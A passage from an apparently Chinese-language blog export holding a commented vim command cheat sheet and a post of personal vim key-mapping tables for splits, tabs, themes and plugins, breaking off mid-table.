<h3 id="指令集"><a href="#指令集" class="headerlink" title="指令集"></a>指令集</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="comment">&quot;================</span></span><br><span class="line"><span class="comment">&quot;=====指令收集=====</span></span><br><span class="line"><span class="comment">&quot;======START=====</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 系统时间</span></span><br><span class="line"><span class="string">&quot;  :map &lt;F7&gt; a&lt;C-R&gt;=strftime(&quot;</span>%<span class="keyword">c</span><span class="comment">&quot;)&lt;CR&gt;&lt;esc&gt;</span></span><br><span class="line"><span class="string">&quot;  :s/__date__/\=strftime(&quot;</span>%<span class="keyword">c</span><span class="comment">&quot;)/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;/*---------------------*\</span></span><br><span class="line"><span class="comment">&quot;         基础命令</span></span><br><span class="line"><span class="comment">&quot;\*---------------------*/</span></span><br><span class="line"><span class="comment">&quot;   ctrl+q              可以联合复制，粘贴，替换用 行操作</span></span><br><span class="line"><span class="comment">&quot;   ctrl+w+j ctrl+w+k (:bn :bp :bd)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;   &#x27;.                  它移动光标到上一次的修改行</span></span><br><span class="line"><span class="comment">&quot;   `.                  它移动光标到上一次的修改点</span></span><br><span class="line"><span class="comment">&quot;   .                   重复上次命令</span></span><br><span class="line"><span class="comment">&quot;   &lt;C-O&gt; :             依次沿着你的跳转记录向回跳 (从最近的一次开始)</span></span><br><span class="line"><span class="comment">&quot;   &lt;C-I&gt; :             依次沿着你的跳转记录向前跳</span></span><br><span class="line"><span class="comment">&quot;   ju(mps) :           列出你跳转的足迹</span></span><br><span class="line"><span class="comment">&quot;   :history :          列出历史命令记录</span></span><br><span class="line"><span class="comment">&quot;   :his c :            命令行命令历史</span></span><br><span class="line"><span class="comment">&quot;   :his s :            搜索命令历史</span></span><br><span class="line"><span class="comment">&quot;   q/ :                搜索命令历史的窗口</span></span><br><span class="line"><span class="comment">&quot;   q: :                命令行命令历史的窗口</span></span><br><span class="line"><span class="comment">&quot;   g ctrl+g            计算文件字符</span></span><br><span class="line"><span class="comment">&quot;   &#123;,&#125;                 前进至上一段落前进至后一段落</span></span><br><span class="line"><span class="comment">&quot;   gg,G(2G)            文件首</span></span><br><span class="line"><span class="comment">&quot;   gd dw gf ga(进制转化)</span></span><br><span class="line"><span class="comment">&quot;   gg=G 全篇自动缩进 , =G 单行缩进</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;* ci[ 删除一对 [] 中的所有字符并进入插入模式</span></span><br><span class="line"><span class="comment">&quot;* ci( 删除一对 () 中的所有字符并进入插入模式</span></span><br><span class="line"><span class="comment">&quot;* ci&lt; 删除一对 &lt;&gt; 中的所有字符并进入插入模式</span></span><br><span class="line"><span class="comment">&quot;* ci&#123; 删除一对 &#123;&#125; 中的所有字符并进入插入模式</span></span><br><span class="line"><span class="comment">&quot;* cit 删除一对 HTML/XML 的标签内部的所有字符并进入插入模式</span></span><br><span class="line"><span class="comment">&quot;* ci” ci’ ci` 删除一对引号字符 (” 或 ‘ 或 `) 中所有字符并进入插入模式</span></span><br><span class="line"><span class="comment">&quot;</span></span><br><span class="line"><span class="comment">&quot;* vi[ 选择一对 [] 中的所有字符</span></span><br><span class="line"><span class="comment">&quot;* vi( 选择一对 () 中的所有字符</span></span><br><span class="line"><span class="comment">&quot;* vi&lt; 选择一对 &lt;&gt; 中的所有字符</span></span><br><span class="line"><span class="comment">&quot;* vi&#123; 选择一对 &#123;&#125; 中的所有字符</span></span><br><span class="line"><span class="comment">&quot;* vit 选择一对 HTML/XML 的标签内部的所有字符</span></span><br><span class="line"><span class="comment">&quot;* vi” vi’ vi` 选择一对引号字符 (” 或 ‘ 或 `) 中所有字符</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;   crl+] 函数原型处 crl+t 回 ( ctags )</span></span><br><span class="line"><span class="comment">&quot;   ctl+p 自动补全( 编辑状态 )</span></span><br><span class="line"><span class="comment">&quot;   :X 加密保存( 要输入密码 )</span></span><br><span class="line"><span class="comment">&quot;   ? /         (N n)</span></span><br><span class="line"><span class="comment">&quot;   f(F,t) 查找字符</span></span><br><span class="line"><span class="comment">&quot;   w(e) 移动光标到下一个单词.</span></span><br><span class="line"><span class="comment">&quot;   5fx 表示查找光标后第 5 个 x 字符.</span></span><br><span class="line"><span class="comment">&quot;   5w(e) 移动光标到下五个单词.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;   b 移动光标到上一个单词.</span></span><br><span class="line"><span class="comment">&quot;   0 移动光标到本行最开头.</span></span><br><span class="line"><span class="comment">&quot;   ^ 移动光标到本行最开头的字符处.</span></span><br><span class="line"><span class="comment">&quot;   $ 移动光标到本行结尾处.</span></span><br><span class="line"><span class="comment">&quot;   H 移动光标到屏幕的首行.</span></span><br><span class="line"><span class="comment">&quot;   M 移动光标到屏幕的中间一行.</span></span><br><span class="line"><span class="comment">&quot;   L 移动光标到屏幕的尾行.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;   c-f (即 ctrl 键与 f 键一同按下)</span></span><br><span class="line"><span class="comment">&quot;   c-b (即 ctrl 键与 b 键一同按下) 翻页</span></span><br><span class="line"><span class="comment">&quot;   c-d (下半页) c-u(上半页) c-e (一行滚动)</span></span><br><span class="line"><span class="comment">&quot;   zz 让光标所在的行居屏幕中央</span></span><br><span class="line"><span class="comment">&quot;   zt 让光标所在的行居屏幕最上一行</span></span><br><span class="line"><span class="comment">&quot;   zb 让光标所在的行居屏幕最下一行</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;   在 vi 中 y 表示拷贝, d 表示删除, p 表示粘贴. 其中拷贝与删除是与光标移动命令</span></span><br><span class="line"><span class="comment">&quot;   yw 表示拷贝从当前光标到光标所在单词结尾的内容.</span></span><br><span class="line"><span class="comment">&quot;   dw 表示删除从当前光标到光标所在单词结尾的内容.</span></span><br><span class="line"><span class="comment">&quot;   y0 表示拷贝从当前光标到光标所在行首的内容.</span></span><br><span class="line"><span class="comment">&quot;   d0 表示删除从当前光标到光标所在行首的内容.</span></span><br><span class="line"><span class="comment">&quot;   y$(Y) 表示拷贝从当前光标到光标所在行尾的内容.</span></span><br><span class="line"><span class="comment">&quot;   d$(D) 表示删除从当前光标到光标所在行尾的内容.</span></span><br><span class="line"><span class="comment">&quot;   yfa 表示拷贝从当前光标到光标后面的第一个a字符之间的内容.</span></span><br><span class="line"><span class="comment">&quot;   dfa 表示删除从当前光标到光标后面的第一个a字符之间的内容.</span></span><br><span class="line"><span class="comment">&quot;   s(S),a(A),x(X),D</span></span><br><span class="line"><span class="comment">&quot;   yy 表示拷贝光标所在行.</span></span><br><span class="line"><span class="comment">&quot;   dd 表示删除光标所在行.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;   5yy 表示拷贝光标以下 5 行.</span></span><br><span class="line"><span class="comment">&quot;   5dd 表示删除光标以下 5 行.</span></span><br><span class="line"><span class="comment">&quot;   y2fa 表示拷贝从当前光标到光标后面的第二个a字符之间的内容.</span></span><br><span class="line"><span class="comment">&quot;   :12,24y 表示拷贝第12行到第24行之间的内容.</span></span><br><span class="line"><span class="comment">&quot;   :12,y 表示拷贝第12行到光标所在行之间的内容.</span></span><br><span class="line"><span class="comment">&quot;   :,24y 表示拷贝光标所在行到第24行之间的内容. 删除类似.</span></span><br><span class="line"><span class="comment">&quot;   TAB 就是制表符, 单独拿出来做一节是因为这个东西确实很有用.</span></span><br><span class="line"><span class="comment">&quot;   &lt;&lt; 输入此命令则光标所在行向左移动一个 tab.</span></span><br><span class="line"><span class="comment">&quot;   &gt;&gt; 输入此命令则光标所在行向右移动一个 tab.</span></span><br><span class="line"><span class="comment">&quot;   5&gt;&gt; 输入此命令则光标后 5 行向右移动一个 tab.</span></span><br><span class="line"><span class="comment">&quot;   :5&gt;&gt;(&gt;&gt;&gt;) :&gt;&gt;(&gt;&gt;&gt;)5</span></span><br><span class="line"><span class="comment">&quot;   :12,24&gt; 此命令将12行到14行的数据都向右移动一个 tab.</span></span><br><span class="line"><span class="comment">&quot;   :12,24&gt;&gt; 此命令将12行到14行的数据都向右移动两个 tab.</span></span><br><span class="line"><span class="comment">&quot;   :set shiftwidth=4 设置自动缩进 4 个空格, 当然要设自动缩进先.</span></span><br><span class="line"><span class="comment">&quot;   :set sts=4 即设置 softtabstop 为 4. 输入 tab 后就跳了 4 格.</span></span><br><span class="line"><span class="comment">&quot;   :set tabstop=4 实际的 tab 即为 4 个空格, 而不是缺省的 8 个.</span></span><br><span class="line"><span class="comment">&quot;   :set expandtab 在输入 tab 后, vim 用恰当的空格来填充这个 tab.</span></span><br><span class="line"><span class="comment">&quot;   :g/^/exec &#x27;s/^/&#x27;.strpart(line(&#x27;.&#x27;).&#x27; &#x27;, 0, 4) 在行首插入行号</span></span><br><span class="line"><span class="comment">&quot;   set ai 设置自动缩进</span></span><br><span class="line"><span class="comment">&quot;   5ia&lt;esc&gt; 重复插入5个a字符</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;/*---------------------*\</span></span><br><span class="line"><span class="comment">&quot;          替换命令</span></span><br><span class="line"><span class="comment">&quot;\*---------------------*/</span></span><br><span class="line"><span class="comment">&quot;   替换文字 2009-02-34 ----&gt; 2009-02-34 00:00:00</span></span><br><span class="line"><span class="comment">&quot;   :%s/\(\d\&#123;4\&#125;-\d\&#123;2\&#125;-\d\&#123;2\&#125;\)/\1 00:00:00/g</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;   :s/aa/bb/g              将光标所在行出现的所有包含 aa 的字符串中的 aa 替换为 bb</span></span><br><span class="line"><span class="comment">&quot;   :s/\/bb/g               将光标所在行出现的所有 aa 替换为 bb, 仅替换 aa 这个单词</span></span><br><span class="line"><span class="comment">&quot;   :%s/aa/bb/g             将文档中出现的所有包含 aa 的字符串中的 aa 替换为 bb</span></span><br><span class="line"><span class="comment">&quot;   :12,23s/aa/bb/g         将从12行到23行中出现的所有包含 aa 的字符串中的 aa 替换为 bb</span></span><br><span class="line"><span class="comment">&quot;   :12,23s/^/#/            将从12行到23行的行首加入 # 字符</span></span><br><span class="line"><span class="comment">&quot;   :%s/fred/joe/igc            一个常见的替换命令，修饰符igc和perl中一样意思</span></span><br><span class="line"><span class="comment">&quot;   s/dick/joe/igc则        对于这些满足条件的行进行替换</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;   :g/^\s*$/d              空行(空格也不包含)删除.</span></span><br><span class="line"><span class="comment">&quot;   :%s/\r//g               删除DOS方式的回车^M</span></span><br><span class="line"><span class="comment">&quot;   :%s/ *$//               删除行尾空白(%s/\s*$//g)</span></span><br><span class="line"><span class="comment">&quot;   :g!/^dd/d               删除不含字符串&#x27;dd&#x27;开头的行</span></span><br><span class="line"><span class="comment">&quot;   :v/^dd/d                同上,译释：v == g!，就是不匹配！</span></span><br><span class="line"><span class="comment">&quot;   :v/./.,/./-1join        压缩空行(多行空行合并为一行)</span></span><br><span class="line"><span class="comment">&quot;   :g/^$/,/./-j            压缩空行(多行空行合并为一行)</span></span><br><span class="line"><span class="comment">&quot;   :g/^/pu _               把文中空行扩增一倍 (pu = put),原来两行间有一个空行，现在变成2个</span></span><br><span class="line"><span class="comment">&quot;   :g/^/m0                 按行翻转文章 (m = move)</span></span><br><span class="line"><span class="comment">&quot;   :g/fred/,/joe/d         not line based (very powerfull)</span></span><br><span class="line"><span class="comment">&quot;   :g/&lt;input\|&lt;form/p      或者 要用\|</span></span><br><span class="line"><span class="comment">&quot;   :g/fred/t$              拷贝行，从fred到文件末尾(EOF)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;   :%norm jdd              隔行删除,译释：%指明是对所有行进行操作,norm指出后面是normal模式的指令,j是下移一行，dd是删除行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;   :&#x27;a,&#x27;bg/fred/s/dick/joe/igc   (&#x27;a,&#x27;b指定一个范围：mark a ~ mark b)</span></span><br><span class="line"><span class="comment">&quot;   g//用一个正则表达式指出了进行操作的行必须可以被fred匹配,g//是一个全局显示命令</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;   /joe/e                  光标停留在匹配单词最后一个字母处</span></span><br><span class="line"><span class="comment">&quot;   /joe/e+1                光标停留在匹配单词最后一个字母的下一个字母处</span></span><br><span class="line"><span class="comment">&quot;   /joe/s                  光标停留在匹配单词第一个字母处</span></span><br><span class="line"><span class="comment">&quot;   /^joe.*fred.*bill/      标准正则表达式</span></span><br><span class="line"><span class="comment">&quot;   /^[A-J]\+/              找一个以A~J中一个字母重复两次或以上开头的行</span></span><br><span class="line"><span class="comment">&quot;   /forum\(\_.\)*pent      多行匹配</span></span><br><span class="line"><span class="comment">&quot;   /fred\_s*joe/i          中间可以有任何空白，包括换行符\n</span></span><br><span class="line"><span class="comment">&quot;   /fred\|joe              匹配FRED或JOE</span></span><br><span class="line"><span class="comment">&quot;   /\&lt;fred\&gt;/i             匹配fred,fred必须是一个独立的单词，而不是子串</span></span><br><span class="line"><span class="comment">&quot;   /\&lt;\d\d\d\d\&gt;           匹配4个数字 \&lt;\d\&#123;4&#125;\&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;   列，替换所有在第三列中的str1</span></span><br><span class="line"><span class="comment">&quot;   :%s:\(\(\w\+\s\+\)\&#123;2&#125;\)str1:\1str2:</span></span><br><span class="line"><span class="comment">&quot;   交换第一列和最后一列 (共4列)</span></span><br><span class="line"><span class="comment">&quot;   :%s:\(\w\+\)\(.*\s\+\)\(\w\+\)$:\3\2\1:</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;   全局(global)显示命令，就是用 :g＋正则表达式</span></span><br><span class="line"><span class="comment">&quot;   译释： :g/&#123;pattern&#125;/&#123;cmd&#125; 就是全局找到匹配的,然后对这些行执行命令&#123;cmd&#125;</span></span><br><span class="line"><span class="comment">&quot;   :g/\&lt;fred\&gt;/                                显示所有能够为单词fred所匹配的行</span></span><br><span class="line"><span class="comment">&quot;   :g/&lt;pattern&gt;/z#.5                           显示内容，还有行号</span></span><br><span class="line"><span class="comment">&quot;   :g/&lt;pattern&gt;/z#.5|echo &#x27;==========&#x27;         漂亮的显示</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;/*---------------------*\</span></span><br><span class="line"><span class="comment">&quot;      多文档操作 (基础)</span></span><br><span class="line"><span class="comment">&quot;\*---------------------*/</span></span><br><span class="line"><span class="comment">&quot;    用 :ls! 可以显示出当前所有的buffer</span></span><br><span class="line"><span class="comment">&quot;   :bn                 跳转到下一个buffer</span></span><br><span class="line"><span class="comment">&quot;   :bp                 跳转到上一个buffer</span></span><br><span class="line"><span class="comment">&quot;   :wn                 存盘当前文件并跳转到下一个</span></span><br><span class="line"><span class="comment">&quot;   :wp                 存盘当前文件并跳转到上一个</span></span><br><span class="line"><span class="comment">&quot;   :bd                 把这个文件从buffer列表中做掉</span></span><br><span class="line"><span class="comment">&quot;   :b 3                跳到第3个buffer</span></span><br><span class="line"><span class="comment">&quot;   :b main             跳到一个名字中包含main的buffer</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;/*---------------------*\</span></span><br><span class="line"><span class="comment">&quot;          列复制</span></span><br><span class="line"><span class="comment">&quot;\*---------------------*/</span></span><br><span class="line"><span class="comment">&quot;   译注：@#%&amp;^#*^%#$!</span></span><br><span class="line"><span class="comment">&quot;   :%s= [^ ]\+$=&amp;&amp;= : 复制最后一列</span></span><br><span class="line"><span class="comment">&quot;   :%s= \f\+$=&amp;&amp;= : 一样的功能</span></span><br><span class="line"><span class="comment">&quot;   :%s= \S\+$=&amp;&amp; : ft,还是一样</span></span><br><span class="line"><span class="comment">&quot;   反向引用，或称记忆</span></span><br><span class="line"><span class="comment">&quot;   :s/\(.*\):\(.*\)/\2 : \1/ : 颠倒用:分割的两个字段</span></span><br><span class="line"><span class="comment">&quot;   :%s/^\(.*\)\n\1/\1$/ : 删除重复行</span></span><br><span class="line"><span class="comment">&quot;   非贪婪匹配，\&#123;-&#125;</span></span><br><span class="line"><span class="comment">&quot;   :%s/^.\&#123;-&#125;pdf/new.pdf/ : 只是删除第一个pdf</span></span><br><span class="line"><span class="comment">&quot;   跨越可能的多行</span></span><br><span class="line"><span class="comment">&quot;   :%s/&lt;!--\_.\&#123;-&#125;--&gt;// : 又是删除多行注释（咦？为什么要说「又」呢？）</span></span><br><span class="line"><span class="comment">&quot;   :help /\&#123;-&#125; : 看看关于 非贪婪数量符 的帮助</span></span><br><span class="line"><span class="comment">&quot;   :s/fred/&lt;c-r&gt;a/g : 替换fred成register a中的内容，呵呵</span></span><br><span class="line"><span class="comment">&quot;   写在一行里的复杂命令</span></span><br><span class="line"><span class="comment">&quot;   :%s/\f\+\.gif\&gt;/\r&amp;\r/g | v/\.gif$/d | %s/gif/jpg/</span></span><br><span class="line"><span class="comment">&quot;   译注：就是用 | 管道啦</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;/*---------------------*\</span></span><br><span class="line"><span class="comment">&quot;         大小写转换</span></span><br><span class="line"><span class="comment">&quot;\*---------------------*/</span></span><br><span class="line"><span class="comment">&quot;   g~~ : 行翻转</span></span><br><span class="line"><span class="comment">&quot;   vEU : 字大写(广义字)</span></span><br><span class="line"><span class="comment">&quot;   vE~ : 字翻转(广义字)</span></span><br><span class="line"><span class="comment">&quot;   ~   将光标下的字母改变大小写</span></span><br><span class="line"><span class="comment">&quot;   3~  将下3个字母改变其大小写</span></span><br><span class="line"><span class="comment">&quot;   g~w 字翻转</span></span><br><span class="line"><span class="comment">&quot;   U   将可视模式下的字母全改成大写字母</span></span><br><span class="line"><span class="comment">&quot;   gUU 将当前行的字母改成大写</span></span><br><span class="line"><span class="comment">&quot;   u   将可视模式下的字母全改成小写</span></span><br><span class="line"><span class="comment">&quot;   guu 将当前行的字母全改成小写</span></span><br><span class="line"><span class="comment">&quot;   gUw 将光标下的单词改成大写。</span></span><br><span class="line"><span class="comment">&quot;   guw 将光标下的单词改成小写。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;/*---------------------*\</span></span><br><span class="line"><span class="comment">&quot;          文件浏览</span></span><br><span class="line"><span class="comment">&quot;\*---------------------*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;   :Ex : 开启目录浏览器，注意首字母E是大写的</span></span><br><span class="line"><span class="comment">&quot;   :Sex : 在一个分割的窗口中开启目录浏览器</span></span><br><span class="line"><span class="comment">&quot;   :ls : 显示当前buffer的情况</span></span><br><span class="line"><span class="comment">&quot;   :cd .. : 进入父目录</span></span><br><span class="line"><span class="comment">&quot;   :pwd</span></span><br><span class="line"><span class="comment">&quot;   :args : 显示目前打开的文件</span></span><br><span class="line"><span class="comment">&quot;   :lcd %:p:h : 更改到当前文件所在的目录</span></span><br><span class="line"><span class="comment">&quot;    译释：lcd是紧紧改变当前窗口的工作路径，% 是代表当前文件的文件名,</span></span><br><span class="line"><span class="comment">&quot;    加上 :p扩展成全名（就是带了路径），加上 :h析取出路径</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;=======END======</span></span><br><span class="line"><span class="comment">&quot;===常用指令收集===</span></span><br><span class="line"><span class="comment">&quot;================</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>vim</category>
      </categories>
      <tags>
        <tag>vim</tag>
      </tags>
  </entry>
  <entry>
    <title>vim键盘映射表</title>
    <url>/2019/09/30/vim%E9%94%AE%E7%9B%98%E6%98%A0%E5%B0%84%E8%A1%A8/</url>
    <content><![CDATA[<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">							  _ ____    __  __    _    ____</span><br><span class="line">  ___  ___  _ __  _   _ _ __ ( ) ___|  |  \/  |  / \  |  _ \</span><br><span class="line"> / _ \/ _ \| <span class="string">&#x27;_ \| | | | &#x27;</span>_ \|/\___ \  | |\/| | / _ \ | |_) |</span><br><span class="line">| __/ (_) |  |  |  |  | _ |  |  |  |  | ___) |  |  |  |  | / ___ \|  __/</span><br><span class="line"> \___|\___/|_| |_|\__,_|_| |_| |____/  |_|  |_/_/   \_\_|</span><br><span class="line">=========================木He寸&amp;eonun=========================</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="普通视图"><a href="#普通视图" class="headerlink" title="普通视图"></a>普通视图</h1><h2 id="控制"><a href="#控制" class="headerlink" title="控制"></a>控制</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">按键</th>
<th style="text-align:left">映射键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>J</code></td>
<td style="text-align:left"><code>5j</code></td>
<td style="text-align:left">下5</td>
</tr>
<tr>
<td style="text-align:left"><code>K</code></td>
<td style="text-align:left"><code>5k</code></td>
<td style="text-align:left">上5</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;&lt;CR&gt;</code></td>
<td style="text-align:left"><code>:nohlsearch&lt;CR&gt;</code></td>
<td style="text-align:left">快捷取消搜索高亮</td>
</tr>
<tr>
<td style="text-align:left"><code>MR</code></td>
<td style="text-align:left"><code>:w $MYVIMRC&lt;CR&gt;</code></td>
<td style="text-align:left">打开vimrc</td>
</tr>
<tr>
<td style="text-align:left"><code>s</code></td>
<td style="text-align:left"><code>&lt;nop&gt;</code></td>
<td style="text-align:left">空</td>
</tr>
<tr>
<td style="text-align:left"><code>S</code></td>
<td style="text-align:left"><code>:w&lt;CR&gt;</code></td>
<td style="text-align:left">保存</td>
</tr>
<tr>
<td style="text-align:left"><code>Q</code></td>
<td style="text-align:left"><code>:q&lt;CR&gt;</code></td>
<td style="text-align:left">退出</td>
</tr>
<tr>
<td style="text-align:left"><code>Y</code></td>
<td style="text-align:left"><code>:w !xclip -i -sel c &lt;CR&gt;</code></td>
<td style="text-align:left">选中行复制到系统剪切板（需安装xclip）</td>
</tr>
<tr>
<td style="text-align:left"><code>Y</code></td>
<td style="text-align:left"><code>&quot;+y</code></td>
<td style="text-align:left">复制到系统剪切板（安装gvim）</td>
</tr>
<tr>
<td style="text-align:left"><code>Ctrl+A</code></td>
<td style="text-align:left"><code>&lt;silent&gt; &lt;C-a&gt; ggvG</code></td>
<td style="text-align:left">全选</td>
</tr>
</tbody>
</table>
</div>
<h2 id="分屏"><a href="#分屏" class="headerlink" title="分屏"></a>分屏</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">按键</th>
<th style="text-align:left">映射键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;s</code></td>
<td style="text-align:left"><code>:e&lt;Space&gt;</code></td>
<td style="text-align:left">打开新文件，需补全路径</td>
</tr>
<tr>
<td style="text-align:left"><code>sk</code></td>
<td style="text-align:left"><code>:set splitbelow&lt;CR&gt;:split&lt;CR&gt;</code></td>
<td style="text-align:left">上分屏</td>
</tr>
<tr>
<td style="text-align:left"><code>sj</code></td>
<td style="text-align:left"><code>:set nosplitbelow&lt;CR&gt;:split&lt;CR&gt;</code></td>
<td style="text-align:left">下分屏</td>
</tr>
<tr>
<td style="text-align:left"><code>sh</code></td>
<td style="text-align:left"><code>:set splitright&lt;CR&gt;:vsplit&lt;CR&gt;</code></td>
<td style="text-align:left">左分屏</td>
</tr>
<tr>
<td style="text-align:left"><code>sl</code></td>
<td style="text-align:left"><code>:set nosplitright&lt;CR&gt;:vsplit&lt;CR&gt;</code></td>
<td style="text-align:left">右分屏</td>
</tr>
<tr>
<td style="text-align:left"><code>sz</code></td>
<td style="text-align:left"><code>&lt;C-w&gt;t&lt;C-w&gt;H</code></td>
<td style="text-align:left">竖向分屏换左右分屏</td>
</tr>
<tr>
<td style="text-align:left"><code>ss</code></td>
<td style="text-align:left"><code>&lt;C-w&gt;t&lt;C-w&gt;K</code></td>
<td style="text-align:left">左右分屏换竖向分屏</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;k</code></td>
<td style="text-align:left"><code>&lt;C-w&gt;k</code></td>
<td style="text-align:left">光标到上屏</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;j</code></td>
<td style="text-align:left"><code>&lt;C-w&gt;j</code></td>
<td style="text-align:left">光标到下屏</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;h</code></td>
<td style="text-align:left"><code>&lt;C-w&gt;h</code></td>
<td style="text-align:left">光标到左屏</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;l</code></td>
<td style="text-align:left"><code>&lt;C-w&gt;l</code></td>
<td style="text-align:left">光标到右屏</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;up&gt;</code></td>
<td style="text-align:left"><code>:res +5&lt;CR&gt;</code></td>
<td style="text-align:left">分屏线上移</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;down&gt;</code></td>
<td style="text-align:left"><code>:res -5&lt;CR&gt;</code></td>
<td style="text-align:left">分屏线下移</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;left&gt;</code></td>
<td style="text-align:left"><code>:vertical resize+5&lt;CR&gt;</code></td>
<td style="text-align:left">分屏线左移</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;right&gt;</code></td>
<td style="text-align:left"><code>:vertical resize-5&lt;CR&gt;</code></td>
<td style="text-align:left">分屏线右移</td>
</tr>
</tbody>
</table>
</div>
<h2 id="选项卡"><a href="#选项卡" class="headerlink" title="选项卡"></a>选项卡</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">按键</th>
<th style="text-align:left">映射键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>tn</code></td>
<td style="text-align:left"><code>:tabe&lt;CR&gt;</code></td>
<td style="text-align:left">打开新选项卡</td>
</tr>
<tr>
<td style="text-align:left"><code>th</code></td>
<td style="text-align:left"><code>:-tabnext&lt;CR&gt;</code></td>
<td style="text-align:left">到左边的选项卡</td>
</tr>
<tr>
<td style="text-align:left"><code>tl</code></td>
<td style="text-align:left"><code>:+tabnext&lt;CR&gt;</code></td>
<td style="text-align:left">到右边的选项卡</td>
</tr>
</tbody>
</table>
</div>
<h2 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">按键</th>
<th style="text-align:left">映射键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;c1</code></td>
<td style="text-align:left"><code>:set background=dark&lt;CR&gt;:colorscheme solarized8&lt;CR&gt;:AirlineTheme jellybeans&lt;CR&gt;</code></td>
<td style="text-align:left">配色1</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;c2</code></td>
<td style="text-align:left"><code>:set background=light&lt;CR&gt;:let ayucolor=&#39;light&#39;&lt;CR&gt;:colorscheme ayu&lt;CR&gt;:AirlineTheme ayu_light&lt;CR&gt;</code></td>
<td style="text-align:left">配色2</td>
</tr>
</tbody>
</table>
</div>
<h2 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">按键</th>
<th style="text-align:left">映射键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>F3</code></td>
<td style="text-align:left"><code>:NERDTreeToggle&lt;CR&gt;</code></td>
<td style="text-align:left">设置目录树快捷键</td>
</tr>
<tr>
<td style="text-align:left"><code>Ctrl+p</code></td>
<td style="text-align:left"><code>map &lt;C-p&gt; :CtrlP&lt;CR&gt;</code></td>
<td style="text-align:left">打开项目文件浏览</td>
</tr>
<tr>
<td style="text-align:left"><code>Ctrl+d</code></td>
<td style="text-align:left"><code>:set cmdheight=2&lt;CR&gt;</code></td>
<td style="text-align:left">修改命令行行数</td>
</tr>
<tr>
<td style="text-align:left"><code>Ctrl+t</code></td>
<td style="text-align:left"><code>:set cmdheight=10&lt;CR&gt;</code></td>
<td style="text-align:left">修改命令行行数</td>
</tr>
<tr>
<td style="text-align:left"><code>TAB</code></td>
<td style="text-align:left"></td>
<td style="text-align:left">补全</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;l</code></td>
<td style="text-align:left"><code>:UndotreeToggle&lt;CR&gt;</code></td>
<td style="text-align:left">文件历史</td>
</tr>
<tr>
<td style="text-align:left"><code>F8</code></td>
<td style="text-align:left"><code>&lt;Plug&gt;MarkdownPreview</code></td>
<td style="text-align:left">浏览Markdown</td>
</tr>
<tr>
<td style="text-align:left"><code>F9</code></td>
<td style="text-align:left"><code>&lt;Plug&gt;MarkdownPreviewStop</code></td>
<td style="text-align:left">关闭Markdown浏览</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;mt</code></td>
<td style="text-align:left"><code>&lt;Plug&gt;MarkdownPreviewToggle</code></td>
<td style="text-align:left">开关Markdown预览</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;tm</code></td>
<td style="text-align:left"><code>:TableModeToggle&lt;CR&gt;</code></td>
<td style="text-align:left">制表工具</td>
</tr>
</tbody>
</table>
</div>
<h2 id="vim默认快捷键"><a href="#vim默认快捷键" class="headerlink" title="vim默认快捷键"></a>vim默认快捷键</h2><h3 id="控制光标"><a href="#控制光标" class="headerlink" title="控制光标"></a>控制光标</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>h</code></td>
